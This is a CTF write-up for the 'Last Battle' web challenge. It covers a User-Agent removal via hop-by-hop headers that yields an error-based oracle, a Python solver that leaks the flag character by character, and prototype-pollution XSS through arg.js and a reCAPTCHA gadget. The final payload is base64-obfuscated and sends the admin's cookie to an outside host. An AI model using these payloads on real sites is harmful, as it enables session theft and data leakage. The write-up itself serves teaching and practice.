# Last Battle 

Last Battle was the final challenge in Yogosha Christmas CTF, combining an interesting attack vectors to get the flag. The source was provided, Flask was taking care of the application's functionality, Nodejs for the admin bot and finally MySQL as a database. 

It was a simple app that allows users to create pastes, search for them. It was clear that this was a client-side challenge. 

At first glance it looked like an **XSS-Leak** challenge, where we can leak admin's pastes


```python
@app.route('/search',methods=["POST"])
@csrf.exempt
def search():
    if 'username' not in session:
        return redirect('/login')
    if 'query' not in request.form:
        return jsonify({"Total":len(get_pastes(session['username']))})
    query = str(request.form.get('query'))
    results = (
        paste for paste in get_pastes(session['username'])
        if query in paste
    )
    try:
        res=next(results)
        agent=request.headers["User-Agent"]
        if len(agent)>10:
            res=agent[0:15]+" is allowed to execute the jutsu: "+res
        else:
            res=agent[0:15]+" is not allowed to execute the jutsu: "+res
        return render_template("view.html",paste="Not Found")
    except StopIteration:
        return render_template("view.html",paste="Not Found")
```

From the above snippet, our search query will result in "Not Found", in other words, we can't search for our pastes which means this was not intended to be an XSS-Leak challenge. 

We know the flag is stored in the admin's paste, so time to change stratigies 

```sql
LOCK TABLES `pastes` WRITE;
/*!40000 ALTER TABLE `pastes` DISABLE KEYS */;
INSERT INTO `pastes` VALUES ('REDACTED','FLAG{REDACTED}','REDACTED');
/*!40000 ALTER TABLE `pastes` ENABLE KEYS */;
UNLOCK TABLES;
```


It was not clear at the begining, even if we had an admin account, we can not utilize **search** to search for the flag. I have spent some time brainstorming ideas to get advantage of the search functionaliy, until I saw that there was an **Apache** configuration file attached to the source, which explains the weird check for the **User-Agent** in **app.py** 

```
<VirtualHost *:*>
        ProxyPreserveHost On
        Header setifempty User-Agent "NarutoBrowseru"
        RequestHeader setifempty User-Agent "NarutoBrowseru"
        ProxyPass / http://0.0.0.0:5000/
        ProxyPassReverse / http://0.0.0.0:5000/
        ServerName localhost
</VirtualHost>
```

## Hop By Hop headers to remove User-Agent

The proxy will force our User-Agent to be **NarutoBrowseru**. I was thinking of a way to remove that, Hop By Hop headers was a good candidate to start with. 

Using my account, I created a paste with a fake flag, and tried to reproduce that. 


```
POST /search HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Cookie: session=eyJjc3JmX3Rva2VuIjoiZTlhNGQ2ZWYzZWRmYWFkZmYzOGQxMTEzN2E2MWJmYjVmOWU1ODlhNSIsInVzZXJuYW1lIjoiZGFhIn0.Y6gCmA.j1cmOce_yncYgHZFrfScq4jGshI
Connection: close,User-Agent

query=FLAG&csrf_token=ImU5YTRkNmVmM2VkZmFhZGZmMzhkMTExMzdhNjFiZmI1ZjllNTg5YTUi.Y6gCmA.CUmdfPFJwXuXeD1HlxpSDx3TDQI
```

The server returned a **500 INTERNAL SERVER ERROR**, and **200 OK** when the paste doesn't exist. This was clear from the code for the search endpint, if the paste doesn't exist, it will not reach the if statement that checks for the User-Agent, so we can use that to leak the flag char by char. 


```python
app_1  |   File "/usr/local/lib/python3.6/dist-packages/werkzeug/datastructures.py", line 1397, in __getitem__
app_1  |     return _unicodify_header_value(self.environ[f"HTTP_{key}"])
app_1  | KeyError: 'HTTP_USER_AGENT'
```

I came up with a Python solver to leak the flag char by char abusing this behaviour

```python
import requests
import string
flag = "FLAG"

chall = "http://127.0.0.1/search"
alpha = string.printable.replace("&","")
cookie = {"session":"eyJjc3JmX3Rva2VuIjoiMGY2Njg5YjljYWM0Y2Y0YWQ0N2M2MDY3MmNmZWVkYTE5ZjllMDQxYSIsInVzZXJuYW1lIjoiaG9ja2FnZSJ9.Y6b4wg.CTkON1BfkzsQgw36CrVTPenKd5o"}
headers = {"Content-Type":"application/x-www-form-urlencoded",
	"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
	"Connection":"close,User-Agent"

}
sess = requests.Session()
sess.verify = False
while 1:
	for char in alpha:
		flagGetter = flag + char
		data = "query={}&csrf_token=ImYxZTI3YzE1YWVjZThiMjg0NmU2MDY2MTZkYjZiMjkxNDYyYTZmNTMi.Y6bcew.MvgTELESsZyEWPR0F_qHumV7GRI".format(flagGetter)
		req = sess.post(chall,data=data,cookies=cookie,headers=headers,proxies={"http":"http://127.0.0.1:8080"})
		sess.headers.update(headers)

		if req.status_code == 500:
			flag+=char
			print(flag)
			break
```

It was not possible to play with the **Connection** header using Python requests, so I created a **match & replace** condition via Burp. Running the script came back with the fake flag.

We need to reproduce the same, but using the admin account. It was obvious that we need to login as an admin, or steal the admin's session. 

## Client-Side Prototype Pollution


After further analysis, I've noticed that **view.html** imports **arg.js** to handle arguments and parameters

```html
<script src="https://raw.githack.com/stretchr/arg.js/master/dist/arg-1.4.js"></script>
<script src="https://www.google.com/recaptcha/api.js" async defer></script>
<script>
    fetch("/search",{method:"POST",credentials:"include"}).then((resp)=>resp.json()).then((data)=>{
        document.getElementById("total").innerText="The total of pastes now: "+data.Total;
    }).catch(
        console.log("error")
    )
    var args=Arg.parse(location.search);
```

**/view** was also an endpoint being used by the app
```python
@app.route("/view",methods=["GET"])
def view():
    if request.args["id"]:
        id=request.args["id"]
        return render_template("view.html",paste=id)
    else:
        return redirect("/home")
```

arg.js is vulnerable to prototype pollution. You can read more about it [here](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/arg-js.md), but we have a similar scenario. 

Using **/view?__proto__[test]=test&id=1337** as a payload worked, it was possible to confirm that via Developer Tools as well

```js
>> x = {}
Object {  }

>> x.test
"test"
```


Our goal is simple now, client-sie prototype pollution > find script gadgets to achieve XSS. Because Google Captcha was being loaded in /veiw.html (for no reason), we can utilize **srcdoc** to achieve XSS, You can read more about it [here](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/recaptcha.md)

**view?__proto__[srcdoc]=<script>alert(1)</script>&id=1337** achieved an alert, so we need to steal the admin's cookie by reporting a cookie stealer to admin. I think it took me 3 hours to relize that the bot is alive and well.  


Final payload

```
http://34.204.107.224/view?__proto__[srcdoc]=<script>eval(atob("bmF2aWdhdG9yLnNlbmRCZWFjb24oYGh0dHA6Ly9ob3N0Lz9jb29raWU9JHtkb2N1bWVudC5jb29raWV9YCk7Cg="))</script>%26id%3D1337
```

Once we get the cookie, it was a matter of reporducing the same step demonstrated above. 


![hop](https://user-images.githubusercontent.com/32583633/209466900-a67f857b-dcaf-4d9a-8e31-d68d49533e8d.png)


